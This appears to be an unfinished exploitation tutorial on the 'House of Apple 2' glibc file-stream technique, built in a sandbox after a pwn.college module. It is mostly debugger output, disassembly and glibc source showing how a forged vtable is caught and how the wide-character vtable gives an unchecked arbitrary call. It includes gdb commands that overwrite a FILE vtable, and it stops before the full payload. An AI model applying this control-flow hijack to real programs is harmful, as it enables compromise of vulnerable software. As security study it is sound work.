# House of Apple 2

> **Note:** This article is a work in progress. Some sections still require technical corrections and further refinement.

**File Stream Oriented Programming (FSOP).** This is about abusing glibc file stream structures to hijack control flow. One way to do this is by corrupting the vtable dispatch mechanism of `_IO_FILE_plus`. Modern glibc validates this vtable, so the obvious approach of replacing it with an arbitrary address doesn't work.

**House of Apple 2** works around this restriction by using a valid `_IO_FILE_plus` vtable to reach the wide-character stream machinery, where a secondary vtable is directly dispatched without range validation. This provides an `arbitrary call` primitive that we can escalate into a stack pivot and a ROP chain.

This repository is a self-contained playground I built after completing the [pwn.college File Struct Exploitation module](https://pwn.college/software-exploitation/file-struct-exploits/). The module is great, but after finishing it I wanted to explore how these techniques translate to the latest versions of glibc. All experiments here use glibc 2.43, shipped with the latest distros available at the time of writing, such as Ubuntu 26.04 and Fedora Workstation 44.

## Exploitation prerequisites

This exploration assumes that we can overwrite a `FILE` structure and that we have both a heap leak and a libc leak. The target binary already provides this.

## Sandbox environment

The sandbox runs Ubuntu 26.04 LTS, giving us a modern environment to explore the technique.

The image includes GDB, pwndbg, pwntools, ropper and tmux. It also contains a target binary with an interactive menu for invoking file stream operations such as `fopen`, `fread`, `fwrite`, and `fclose`. This gives us a convenient way to manipulate streams while debugging and testing ideas.

Build and run the sandbox with:

```
./build.sh
./run.sh
```

## Exploration

Let's start by inspecting the `_IO_FILE` and `_IO_FILE_plus` structures:

```c
pwndbg> ptype struct _IO_FILE
type = struct _IO_FILE {
    int _flags;
    char *_IO_read_ptr;
    char *_IO_read_end;
    char *_IO_read_base;
    char *_IO_write_base;
    char *_IO_write_ptr;
    char *_IO_write_end;
    char *_IO_buf_base;
    char *_IO_buf_end;
    char *_IO_save_base;
    char *_IO_backup_base;
    char *_IO_save_end;
    struct _IO_marker *_markers;
    struct _IO_FILE *_chain;
    int _fileno;
    int _flags2 : 24;
    char _short_backupbuf[1];
    __off_t _old_offset;
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];
    _IO_lock_t *_lock;
    __off64_t _offset;
    struct _IO_codecvt *_codecvt;
    struct _IO_wide_data *_wide_data;
    struct _IO_FILE *_freeres_list;
    void *_freeres_buf;
    struct _IO_FILE **_prevchain;
    int _mode;
    int _unused3;
    __uint64_t _total_written;
    char _unused2[8];
}

```

```c
pwndbg> ptype struct _IO_FILE_plus
type = struct _IO_FILE_plus {
    FILE file;
    const struct _IO_jump_t *vtable;
}

```

In practical terms, `_IO_FILE_plus` is an `_IO_FILE` with a vtable pointer. That immediately looks interesting: if we can control this pointer, we may be able to redirect an indirect call and hijack control flow.

### Inspecting the file stream vtable

To inspect the vtable, let's examine a `FILE` pointer returned by `fopen`.

```c
pwndbg> x/a ((struct _IO_FILE_plus *)0x87b8010)->vtable
0x7f91cc001030 <_IO_file_jumps>:        0x0
```

The pointer targets the `_IO_file_jumps` table.

```c
pwndbg> tele &_IO_file_jumps 21
00:0000│     0x7f91cc001030 (_IO_file_jumps) ◂— 0
01:0008│     0x7f91cc001038 (_IO_file_jumps+8) ◂— 0
02:0010│     0x7f91cc001040 (_IO_file_jumps+16) —▸ 0x7f91cbe89120 (_IO_file_finish) ◂— endbr64
03:0018│     0x7f91cc001048 (_IO_file_jumps+24) —▸ 0x7f91cbe8a730 (_IO_file_overflow) ◂— endbr64
04:0020│     0x7f91cc001050 (_IO_file_jumps+32) —▸ 0x7f91cbe89f30 (_IO_file_underflow) ◂— endbr64
05:0028│     0x7f91cc001058 (_IO_file_jumps+40) —▸ 0x7f91cbe8d2c0 (_IO_default_uflow) ◂— endbr64
06:0030│     0x7f91cc001060 (_IO_file_jumps+48) —▸ 0x7f91cbe8ed00 (_IO_default_pbackfail) ◂— endbr64
07:0038│     0x7f91cc001068 (_IO_file_jumps+56) —▸ 0x7f91cbe8b400 (_IO_file_xsputn) ◂— endbr64
08:0040│     0x7f91cc001070 (_IO_file_jumps+64) —▸ 0x7f91cbe8b7b0 (__GI__IO_file_xsgetn) ◂— endbr64
09:0048│     0x7f91cc001078 (_IO_file_jumps+72) —▸ 0x7f91cbe8aaf0 (_IO_file_seekoff) ◂— endbr64
0a:0050│     0x7f91cc001080 (_IO_file_jumps+80) —▸ 0x7f91cbe8d9e0 (_IO_default_seekpos) ◂— endbr64
0b:0058│     0x7f91cc001088 (_IO_file_jumps+88) —▸ 0x7f91cbe89cb0 (_IO_file_setbuf) ◂— endbr64
0c:0060│     0x7f91cc001090 (_IO_file_jumps+96) —▸ 0x7f91cbe8a940 (_IO_file_sync) ◂— endbr64
0d:0068│     0x7f91cc001098 (_IO_file_jumps+104) —▸ 0x7f91cbe7bc00 (_IO_file_doallocate) ◂— endbr64
0e:0070│     0x7f91cc0010a0 (_IO_file_jumps+112) —▸ 0x7f91cbe8b2c0 (_IO_file_read) ◂— endbr64
0f:0078│     0x7f91cc0010a8 (_IO_file_jumps+120) —▸ 0x7f91cbe8b350 (_IO_file_write) ◂— endbr64
10:0080│     0x7f91cc0010b0 (_IO_file_jumps+128) —▸ 0x7f91cbe8b2e0 (_IO_file_seek) ◂— endbr64
11:0088│     0x7f91cc0010b8 (_IO_file_jumps+136) —▸ 0x7f91cbe8b340 (_IO_file_close) ◂— endbr64
12:0090│     0x7f91cc0010c0 (_IO_file_jumps+144) —▸ 0x7f91cbe8b2f0 (_IO_file_stat) ◂— endbr64
13:0098│     0x7f91cc0010c8 (_IO_file_jumps+152) —▸ 0x7f91cbe8eef0 (_IO_default_showmanyc) ◂— endbr64
14:00a0│     0x7f91cc0010d0 (_IO_file_jumps+160) —▸ 0x7f91cbe8ef00 (_IO_default_imbue) ◂— endbr64
```

This is a set of 21 function pointers. File stream operations dispatch through different entries depending on the execution path.

### Following the `fwrite` path

For this exploration I'll focus on the `fwrite` path. After placing breakpoints on each function and calling `fwrite`, the first breakpoint we hit is `_IO_file_xsputn`.

```c
b► 0x7f91cbe8b400 <_IO_file_xsputn>       endbr64
   0x7f91cbe8b404 <_IO_file_xsputn+4>     push   rbp
   0x7f91cbe8b405 <_IO_file_xsputn+5>     mov    rbp, rsp      RBP => 0x7ffdc1b9bcd0 —▸ 0x7ffdc1b9bd30 —▸ 0x7ffdc1b9bd70 —▸ 0x7ffdc1b9bdf0 ◂— ...
   0x7f91cbe8b408 <_IO_file_xsputn+8>     push   r13
   0x7f91cbe8b40a <_IO_file_xsputn+10>    push   r12
   0x7f91cbe8b40c <_IO_file_xsputn+12>    mov    r12, rdx      R12 => 1
   0x7f91cbe8b40f <_IO_file_xsputn+15>    xor    edx, edx      EDX => 0
   0x7f91cbe8b411 <_IO_file_xsputn+17>    push   rbx
   0x7f91cbe8b412 <_IO_file_xsputn+18>    sub    rsp, 0x28     RSP => 0x7ffdc1b9bc90 (0x7ffdc1b9bcb8 - 0x28)
   0x7f91cbe8b416 <_IO_file_xsputn+22>    test   r12, r12      1 & 1     EFLAGS => 0x202 [ cf pf af zf sf IF df of iopl:00 ac ]
   0x7f91cbe8b419 <_IO_file_xsputn+25>  ✘ je     _IO_file_xsputn+113         <_IO_file_xsputn+113>
──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffdc1b9bcd8 —▸ 0x7f91cbe7d63b (fwrite+219) ◂— mov edx, dword ptr [rbx]
01:0008│-050 0x7ffdc1b9bce0 —▸ 0x7ffdc1b9bd00 ◂— 1
02:0010│-048 0x7ffdc1b9bce8 —▸ 0x7f91cbf1832e (read+30) ◂— leave
03:0018│-040 0x7ffdc1b9bcf0 ◂— 0
04:0020│-038 0x7ffdc1b9bcf8 ◂— 1
... ↓        2 skipped
07:0038│-020 0x7ffdc1b9bd10 ◂— 0
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0 0x7f91cbe8b400 _IO_file_xsputn
   1 0x7f91cbe7d63b fwrite+219
   2 0x401863       op_fwrite+151
   3 0x401b57       main+347
   4 0x7f91cbe1a601 __libc_start_call_main+129
   5 0x7f91cbe1a718 __libc_start_main+136
   6 0x401185       _start+37

```

The call happens at `fwrite+216`. This matches the [glibc source](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/iofwrite.c#L44): `_IO_sputn` is a macro that dispatches through the vtable, resolving to `_IO_file_xsputn` for this stream.

```asm
   0x00007f91cbe7d62a <+202>:   mov    rdx,rcx
   0x00007f91cbe7d62d <+205>:   mov    rdi,rbx
   0x00007f91cbe7d630 <+208>:   mov    QWORD PTR [rbp-0x30],r8
   0x00007f91cbe7d634 <+212>:   mov    QWORD PTR [rbp-0x28],rcx
   0x00007f91cbe7d638 <+216>:   call   QWORD PTR [rax+0x38]
```

### Attempting to replace the vtable

For a first attempt, let's overwrite the vtable pointer with `desired_func - 0x38` and set a breakpoint at `fwrite+216`.

```c
pwndbg> p &win
$3 = (<text variable, no debug info> *) 0x4019e1 <win>
pwndbg> p/x &win - 0x38
$4 = 0x4019a9
pwndbg> set ((struct _IO_FILE_plus *)0x38588010)->vtable = (void *)0x4019a9
pwndbg> b *fwrite+216
Breakpoint 4 at 0x7f641fc9d638: file ./libio/libioP.h, line 1042.
```

```
gdb: Program received signal SIGABRT
Output: Fatal error: glibc detected an invalid stdio handle
```

Oops, execution aborts before reaching the breakpoint. The error suggests that glibc validates the vtable pointer before performing the indirect call. Let's inspect the backtrace and see where this happens.

```c
pwndbg> backtrace
#0  __pthread_kill_implementation (threadid=<optimized out>, signo=0x6, no_tid=0x0) at ./nptl/pthread_kill.c:44
#1  __pthread_kill_internal (threadid=<optimized out>, signo=0x6) at ./nptl/pthread_kill.c:89
#2  __GI___pthread_kill (threadid=<optimized out>, signo=signo@entry=0x6) at ./nptl/pthread_kill.c:100
#3  0x00007f641fc55b7e in __GI_raise (sig=sig@entry=0x6) at ../sysdeps/posix/raise.c:26
#4  0x00007f641fc388ec in __GI_abort () at ./stdlib/abort.c:77
#5  0x00007f641fc39979 in __libc_message_impl (vma_name=vma_name@entry=0x7f641fdeb569 "glibc: fatal", fmt=fmt@entry=0x7f641fdee8c6 "%s") at ../sysdeps/posix/libc_fatal.c:138
#6  0x00007f641fca8000 in __libc_message_wrapper (vmaname=0x7f641fdeb569 "glibc: fatal", fmt=0x7f641fdee8c6 "%s") at ../include/stdio.h:203
#7  __GI___libc_fatal (message=message@entry=0x7f641fdf0b98 "Fatal error: glibc detected an invalid stdio handle\n") at ../sysdeps/posix/libc_fatal.c:147
#8  0x00007f641fca88c5 in _IO_vtable_check () at ./libio/vtables.c:534
#9  _IO_vtable_check () at ./libio/vtables.c:504
#10 0x00007f641fc9d799 in IO_validate_vtable (vtable=0x4019a9 <op_inspect+9>) at ./libio/libioP.h:1041
#11 __GI__IO_fwrite (buf=<optimized out>, size=<optimized out>, count=<optimized out>, fp=0x38588010) at ./libio/iofwrite.c:44
#12 0x0000000000401863 in op_fwrite ()
#13 0x0000000000401b57 in main ()
#14 0x00007f641fc3a601 in __libc_start_call_main (main=main@entry=0x4019fc <main>, argc=argc@entry=0x1, argv=argv@entry=0x7ffe0fa24b08) at ../sysdeps/nptl/libc_start_call_main.h:59
#15 0x00007f641fc3a718 in __libc_start_main_impl (main=0x4019fc <main>, argc=0x1, argv=0x7ffe0fa24b08, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffe0fa24af8) at ../csu/libc-start.c:360
#16 0x0000000000401185 in _start ()
```

`fwrite` reaches `_IO_vtable_check` which is rejecting the forged vtable pointer.

```asm
pwndbg> disass _IO_vtable_check
Dump of assembler code for function _IO_vtable_check:
   0x00007f641fca8840 <+0>:     endbr64
   0x00007f641fca8844 <+4>:     push   rbp
   0x00007f641fca8845 <+5>:     lea    rdi,[rip+0xfffffffffffffff4]        # 0x7f641fca8840 <_IO_vtable_check>
   0x00007f641fca884c <+12>:    mov    rbp,rsp
   0x00007f641fca884f <+15>:    sub    rsp,0x40
   0x00007f641fca8853 <+19>:    mov    rax,QWORD PTR fs:0x28
   0x00007f641fca885c <+28>:    mov    QWORD PTR [rbp-0x8],rax
   0x00007f641fca8860 <+32>:    mov    rax,QWORD PTR [rip+0x17bea1]        # 0x7f641fe24708 <IO_accept_foreign_vtables>
   0x00007f641fca8867 <+39>:    ror    rax,0x11
   0x00007f641fca886b <+43>:    xor    rax,QWORD PTR fs:0x30
   0x00007f641fca8874 <+52>:    cmp    rax,rdi
   0x00007f641fca8877 <+55>:    je     0x7f641fca88a8 <_IO_vtable_check+104>
   0x00007f641fca8879 <+57>:    mov    rax,QWORD PTR [rip+0x179638]        # 0x7f641fe21eb8
   0x00007f641fca8880 <+64>:    cmp    QWORD PTR [rax+0x2c8],0x0
   0x00007f641fca8888 <+72>:    je     0x7f641fca88a8 <_IO_vtable_check+104>
   0x00007f641fca888a <+74>:    xor    ecx,ecx
   0x00007f641fca888c <+76>:    lea    rdx,[rbp-0x38]
   0x00007f641fca8890 <+80>:    lea    rsi,[rbp-0x30]
   0x00007f641fca8894 <+84>:    call   0x7f641fda2de0 <_dl_addr>
   0x00007f641fca8899 <+89>:    test   eax,eax
   0x00007f641fca889b <+91>:    je     0x7f641fca88b9 <_IO_vtable_check+121>
   0x00007f641fca889d <+93>:    mov    rax,QWORD PTR [rbp-0x38]
   0x00007f641fca88a1 <+97>:    cmp    QWORD PTR [rax+0x30],0x0
   0x00007f641fca88a6 <+102>:   je     0x7f641fca88b9 <_IO_vtable_check+121>
   0x00007f641fca88a8 <+104>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00007f641fca88ac <+108>:   sub    rax,QWORD PTR fs:0x28
   0x00007f641fca88b5 <+117>:   jne    0x7f641fca88c5 <_IO_vtable_check+133>
   0x00007f641fca88b7 <+119>:   leave
   0x00007f641fca88b8 <+120>:   ret
   0x00007f641fca88b9 <+121>:   lea    rdi,[rip+0x1482d8]        # 0x7f641fdf0b98
   0x00007f641fca88c0 <+128>:   call   0x7f641fca7fe0 <__GI___libc_fatal>
   0x00007f641fca88c5 <+133>:   call   0x7f641fd553a0 <__stack_chk_fail>
```

The implementation contains a mechanism for accepting foreign vtables, but it is not under our control. The relevant code is available in [`vtables.c`](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/vtables.c#L504).

### Understanding the vtable validation

By the time `_IO_vtable_check` is called, we're already doomed. The earlier `IO_validate_vtable` frame in the backtrace is the interesting part, so let's inspect that instead.

```c
pwndbg> disass IO_validate_vtable
❌️ No symbol "IO_validate_vtable" in current context.
```

GDB cannot resolve `IO_validate_vtable` as a symbol. Looking at the [source](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/libioP.h#L1033), we can see it is inlined into `fwrite`.

```asm
   0x00007f641fc9d5f6 <+150>:   lea    rdi,[rip+0x1838e3]        # 0x7f641fe20ee0 <__io_vtables>
   0x00007f641fc9d5fd <+157>:   mov    rax,QWORD PTR [rbx+0xd8]
   0x00007f641fc9d604 <+164>:   mov    r14,QWORD PTR [rbx+0xc8]
   0x00007f641fc9d60b <+171>:   mov    r15,QWORD PTR [rbx+0x28]
   0x00007f641fc9d60f <+175>:   mov    r12,QWORD PTR [rbx+0x20]
   0x00007f641fc9d613 <+179>:   mov    rdx,rax
   0x00007f641fc9d616 <+182>:   sub    rdx,rdi
   0x00007f641fc9d619 <+185>:   cmp    rdx,0x92f
   0x00007f641fc9d620 <+192>:   ja     0x7f641fc9d780 <__GI__IO_fwrite+544>
```

A vtable pointer is accepted only when it falls within `[__io_vtables, __io_vtables + IO_VTABLES_LEN)`. So we cannot simply point it anywhere we want. Still, this is a fairly large region containing several jump tables, which gives us something to explore.

The valid range begins as follows:

```
pwndbg> tele &__io_vtables 0x92f/8
00:0000│     0x7f641fe20ee0 (__io_vtables) ◂— 0
01:0008│     0x7f641fe20ee8 (__io_vtables+8) ◂— 0
02:0010│     0x7f641fe20ef0 (__io_vtables+16) —▸ 0x7f641fcaf860 (_IO_str_finish) ◂— endbr64
03:0018│     0x7f641fe20ef8 (__io_vtables+24) —▸ 0x7f641fcaf300 (_IO_str_overflow) ◂— endbr64
04:0020│     0x7f641fe20f00 (__io_vtables+32) —▸ 0x7f641fcaf4d0 (_IO_str_underflow) ◂— endbr64
05:0028│     0x7f641fe20f08 (__io_vtables+40) —▸ 0x7f641fcad2c0 (_IO_default_uflow) ◂— endbr64
06:0030│     0x7f641fe20f10 (__io_vtables+48) —▸ 0x7f641fcaf840 (_IO_str_pbackfail) ◂— endbr64
07:0038│     0x7f641fe20f18 (__io_vtables+56) —▸ 0x7f641fcad320 (_IO_default_xsputn) ◂— endbr64
08:0040│     0x7f641fe20f20 (__io_vtables+64) —▸ 0x7f641fcad570 (_IO_default_xsgetn) ◂— endbr64
09:0048│     0x7f641fe20f28 (__io_vtables+72) —▸ 0x7f641fcaf550 (_IO_str_seekoff) ◂— endbr64
0a:0050│     0x7f641fe20f30 (__io_vtables+80) —▸ 0x7f641fcad9e0 (_IO_default_seekpos) ◂— endbr64
0b:0058│     0x7f641fe20f38 (__io_vtables+88) —▸ 0x7f641fcad8f0 (_IO_default_setbuf) ◂— endbr64
0c:0060│     0x7f641fe20f40 (__io_vtables+96) —▸ 0x7f641fcadc80 (_IO_default_sync) ◂— endbr64
0d:0068│     0x7f641fe20f48 (__io_vtables+104) —▸ 0x7f641fcada50 (_IO_default_doallocate) ◂— endbr64
0e:0070│     0x7f641fe20f50 (__io_vtables+112) —▸ 0x7f641fcaeed0 (_IO_default_read) ◂— endbr64
0f:0078│     0x7f641fe20f58 (__io_vtables+120) —▸ 0x7f641fcaeee0 (_IO_default_write) ◂— endbr64
10:0080│     0x7f641fe20f60 (__io_vtables+128) —▸ 0x7f641fcaeeb0 (_IO_default_seek) ◂— endbr64
11:0088│     0x7f641fe20f68 (__io_vtables+136) —▸ 0x7f641fcadc80 (_IO_default_sync) ◂— endbr64
12:0090│     0x7f641fe20f70 (__io_vtables+144) —▸ 0x7f641fcaeec0 (_IO_default_stat) ◂— endbr64
13:0098│     0x7f641fe20f78 (__io_vtables+152) —▸ 0x7f641fcaeef0 (_IO_default_showmanyc) ◂— endbr64
14:00a0│     0x7f641fe20f80 (__io_vtables+160) —▸ 0x7f641fcaef00 (_IO_default_imbue) ◂— endbr64
15:00a8│     0x7f641fe20f88 (__io_vtables+168) ◂— 0
16:00b0│     0x7f641fe20f90 (__io_vtables+176) ◂— 0
17:00b8│     0x7f641fe20f98 (__io_vtables+184) —▸ 0x7f641fca35b0 (_IO_wstr_finish) ◂— endbr64
18:00c0│     0x7f641fe20fa0 (__io_vtables+192) —▸ 0x7f641fca2f60 (_IO_wstr_overflow) ◂— endbr64
19:00c8│     0x7f641fe20fa8 (__io_vtables+200) —▸ 0x7f641fca31b0 (_IO_wstr_underflow) ◂— endbr64
1a:00d0│     0x7f641fe20fb0 (__io_vtables+208) —▸ 0x7f641fca1cb0 (_IO_wdefault_uflow) ◂— endbr64
1b:00d8│     0x7f641fe20fb8 (__io_vtables+216) —▸ 0x7f641fca3590 (_IO_wstr_pbackfail) ◂— endbr64
1c:00e0│     0x7f641fe20fc0 (__io_vtables+224) —▸ 0x7f641fca1dc0 (_IO_wdefault_xsputn) ◂— endbr64
1d:00e8│     0x7f641fe20fc8 (__io_vtables+232) —▸ 0x7f641fca2560 (_IO_wdefault_xsgetn) ◂— endbr64
1e:00f0│     0x7f641fe20fd0 (__io_vtables+240) —▸ 0x7f641fca3240 (_IO_wstr_seekoff) ◂— endbr64
1f:00f8│     0x7f641fe20fd8 (__io_vtables+248) —▸ 0x7f641fcad9e0 (_IO_default_seekpos) ◂— endbr64
20:0100│     0x7f641fe20fe0 (__io_vtables+256) —▸ 0x7f641fcad8f0 (_IO_default_setbuf) ◂— endbr64
21:0108│     0x7f641fe20fe8 (__io_vtables+264) —▸ 0x7f641fcadc80 (_IO_default_sync) ◂— endbr64
22:0110│     0x7f641fe20ff0 (__io_vtables+272) —▸ 0x7f641fca20f0 (_IO_wdefault_doallocate) ◂— endbr64
23:0118│     0x7f641fe20ff8 (__io_vtables+280) —▸ 0x7f641fcaeed0 (_IO_default_read) ◂— endbr64
24:0120│     0x7f641fe21000 (__io_vtables+288) —▸ 0x7f641fcaeee0 (_IO_default_write) ◂— endbr64
25:0128│     0x7f641fe21008 (__io_vtables+296) —▸ 0x7f641fcaeeb0 (_IO_default_seek) ◂— endbr64
26:0130│     0x7f641fe21010 (__io_vtables+304) —▸ 0x7f641fcadc80 (_IO_default_sync) ◂— endbr64
27:0138│     0x7f641fe21018 (__io_vtables+312) —▸ 0x7f641fcaeec0 (_IO_default_stat) ◂— endbr64
28:0140│     0x7f641fe21020 (__io_vtables+320) —▸ 0x7f641fcaeef0 (_IO_default_showmanyc) ◂— endbr64
29:0148│     0x7f641fe21028 (__io_vtables+328) —▸ 0x7f641fcaef00 (_IO_default_imbue) ◂— endbr64
2a:0150│     0x7f641fe21030 (_IO_file_jumps) ◂— 0
2b:0158│     0x7f641fe21038 (_IO_file_jumps+8) ◂— 0
2c:0160│     0x7f641fe21040 (_IO_file_jumps+16) —▸ 0x7f641fca9120 (_IO_file_finish) ◂— endbr64
2d:0168│     0x7f641fe21048 (_IO_file_jumps+24) —▸ 0x7f641fcaa730 (_IO_file_overflow) ◂— endbr64
2e:0170│     0x7f641fe21050 (_IO_file_jumps+32) —▸ 0x7f641fca9f30 (_IO_file_underflow) ◂— endbr64
2f:0178│     0x7f641fe21058 (_IO_file_jumps+40) —▸ 0x7f641fcad2c0 (_IO_default_uflow) ◂— endbr64
30:0180│     0x7f641fe21060 (_IO_file_jumps+48) —▸ 0x7f641fcaed00 (_IO_default_pbackfail) ◂— endbr64
...
```

## House of Apple 2

We now understand the basic mechanism and its main constraint: the `_IO_FILE_plus` vtable must point somewhere inside glibc's valid vtable region. This blocks the obvious approach but it does not completely close the door.

House of Apple 2 gets around this by reaching a second vtable through the wide-character stream machinery. This second vtable is not validated in the same way. Let's follow that path in GDB and see how the pieces connect.

### The wide-character stream machinery

Back in `_IO_FILE`, there is a `_wide_data` field pointing to an `_IO_wide_data` structure. This structure has a vtable of its own.

```c
pwndbg> ptype struct _IO_wide_data
type = struct _IO_wide_data {
    wchar_t *_IO_read_ptr;
    wchar_t *_IO_read_end;
    wchar_t *_IO_read_base;
    wchar_t *_IO_write_base;
    wchar_t *_IO_write_ptr;
    wchar_t *_IO_write_end;
    wchar_t *_IO_buf_base;
    wchar_t *_IO_buf_end;
    wchar_t *_IO_save_base;
    wchar_t *_IO_backup_base;
    wchar_t *_IO_save_end;
    __mbstate_t _IO_state;
    __mbstate_t _IO_last_state;
    struct _IO_codecvt _codecvt;
    wchar_t _shortbuf[1];
    const struct _IO_jump_t *_wide_vtable;
}
```

Its layout looks quite similar to `_IO_FILE`. It is part of glibc's machinery for handling wide-character streams.

The path we want goes through [`_IO_wfile_overflow`](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/wfileops.c#L407), which can eventually call [`_IO_wdoallocbuf`](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/wgenops.c#L364).

```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0
      || f->_wide_data->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == NULL)
	{
	  _IO_wdoallocbuf (f); // <- this is it
	  _IO_free_wbackup_area (f);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);
	}
      else
	{
      ...
```

```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
```

`_IO_WDOALLOCATE` is another dispatch macro, this time operating through the wide vtable. The indirect call becomes clear in the disassembly:

```asm
pwndbg> x/15i _IO_wdoallocbuf
   0x7f7c3a535020 <__GI__IO_wdoallocbuf>:       endbr64
   0x7f7c3a535024 <__GI__IO_wdoallocbuf+4>:     mov    rax,QWORD PTR [rdi+0xa0]
   0x7f7c3a53502b <__GI__IO_wdoallocbuf+11>:    cmp    QWORD PTR [rax+0x30],0x0
   0x7f7c3a535030 <__GI__IO_wdoallocbuf+16>:    je     0x7f7c3a535038 <__GI__IO_wdoallocbuf+24>
   0x7f7c3a535032 <__GI__IO_wdoallocbuf+18>:    ret
   0x7f7c3a535033 <__GI__IO_wdoallocbuf+19>:    nop    DWORD PTR [rax+rax*1+0x0]
   0x7f7c3a535038 <__GI__IO_wdoallocbuf+24>:    push   rbp
   0x7f7c3a535039 <__GI__IO_wdoallocbuf+25>:    mov    rdx,rdi
   0x7f7c3a53503c <__GI__IO_wdoallocbuf+28>:    mov    rbp,rsp
   0x7f7c3a53503f <__GI__IO_wdoallocbuf+31>:    sub    rsp,0x20
   0x7f7c3a535043 <__GI__IO_wdoallocbuf+35>:    test   BYTE PTR [rdi],0x2
   0x7f7c3a535046 <__GI__IO_wdoallocbuf+38>:    jne    0x7f7c3a5350e0 <__GI__IO_wdoallocbuf+192>
   0x7f7c3a53504c <__GI__IO_wdoallocbuf+44>:    mov    rax,QWORD PTR [rax+0xe0]
   0x7f7c3a535053 <__GI__IO_wdoallocbuf+51>:    mov    QWORD PTR [rbp-0x8],rdi
   0x7f7c3a535057 <__GI__IO_wdoallocbuf+55>:    call   QWORD PTR [rax+0x68]
```

Here is the interesting part. At `_IO_wdoallocbuf+44` glibc loads the `_wide_vtable` pointer from `_wide_data`. At `_IO_wdoallocbuf+55` it calls the function pointer at `_wide_vtable + 0x68`. This time there is no range validation.

### Connecting the two vtables

Now the pieces start to connect. `_IO_wfile_overflow` belongs to `_IO_wfile_jumps` which exists inside the valid range accepted by the first vtable check. From there, execution can reach another indirect call through the unvalidated `_wide_vtable`.

```asm
pwndbg> tele &_IO_wfile_jumps 21
00:0000│     0x7f7c3a6b4228 (_IO_wfile_jumps) ◂— 0
01:0008│     0x7f7c3a6b4230 (_IO_wfile_jumps+8) ◂— 0
02:0010│     0x7f7c3a6b4238 (_IO_wfile_jumps+16) —▸ 0x7f7c3a53c120 (_IO_file_finish) ◂— endbr64
03:0018│     0x7f7c3a6b4240 (_IO_wfile_jumps+24) —▸ 0x7f7c3a537110 (_IO_wfile_overflow) ◂— endbr64
04:0020│     0x7f7c3a6b4248 (_IO_wfile_jumps+32) —▸ 0x7f7c3a5368c0 (_IO_wfile_underflow) ◂— endbr64
05:0028│     0x7f7c3a6b4250 (_IO_wfile_jumps+40) —▸ 0x7f7c3a534cb0 (_IO_wdefault_uflow) ◂— endbr64
06:0030│     0x7f7c3a6b4258 (_IO_wfile_jumps+48) —▸ 0x7f7c3a534a50 (_IO_wdefault_pbackfail) ◂— endbr64
07:0038│     0x7f7c3a6b4260 (_IO_wfile_jumps+56) —▸ 0x7f7c3a537e40 (_IO_wfile_xsputn) ◂— endbr64
08:0040│     0x7f7c3a6b4268 (_IO_wfile_jumps+64) —▸ 0x7f7c3a53e7b0 (__GI__IO_file_xsgetn) ◂— endbr64
09:0048│     0x7f7c3a6b4270 (_IO_wfile_jumps+72) —▸ 0x7f7c3a537550 (_IO_wfile_seekoff) ◂— endbr64
0a:0050│     0x7f7c3a6b4278 (_IO_wfile_jumps+80) —▸ 0x7f7c3a5409e0 (_IO_default_seekpos) ◂— endbr64
0b:0058│     0x7f7c3a6b4280 (_IO_wfile_jumps+88) —▸ 0x7f7c3a53ccb0 (_IO_file_setbuf) ◂— endbr64
0c:0060│     0x7f7c3a6b4288 (_IO_wfile_jumps+96) —▸ 0x7f7c3a5373b0 (_IO_wfile_sync) ◂— endbr64
0d:0068│     0x7f7c3a6b4290 (_IO_wfile_jumps+104) —▸ 0x7f7c3a5304d0 (_IO_wfile_doallocate) ◂— endbr64
0e:0070│     0x7f7c3a6b4298 (_IO_wfile_jumps+112) —▸ 0x7f7c3a53e2c0 (_IO_file_read) ◂— endbr64
0f:0078│     0x7f7c3a6b42a0 (_IO_wfile_jumps+120) —▸ 0x7f7c3a53e350 (_IO_file_write) ◂— endbr64
10:0080│     0x7f7c3a6b42a8 (_IO_wfile_jumps+128) —▸ 0x7f7c3a53e2e0 (_IO_file_seek) ◂— endbr64
11:0088│     0x7f7c3a6b42b0 (_IO_wfile_jumps+136) —▸ 0x7f7c3a53e340 (_IO_file_close) ◂— endbr64
12:0090│     0x7f7c3a6b42b8 (_IO_wfile_jumps+144) —▸ 0x7f7c3a53e2f0 (_IO_file_stat) ◂— endbr64
13:0098│     0x7f7c3a6b42c0 (_IO_wfile_jumps+152) —▸ 0x7f7c3a541ef0 (_IO_default_showmanyc) ◂— endbr64
14:00a0│     0x7f7c3a6b42c8 (_IO_wfile_jumps+160) —▸ 0x7f7c3a541f00 (_IO_default_imbue) ◂— endbr64
```

```c
pwndbg> p &__io_vtables < &_IO_wfile_jumps < (void *)&__io_vtables+0x92f
$5 = 0x1
```

The general idea is now:

1. Set the `_IO_FILE_plus` vtable so that the relevant slot resolves to `_IO_wfile_overflow`.
2. Point `_wide_data` to a forged `_IO_wide_data` structure whose `_wide_vtable` is `desired_function - 0x68`.

Before trying the next run, we need to satisfy a few conditions to reach `_IO_wdoallocbuf`.

In `_IO_wfile_overflow`:

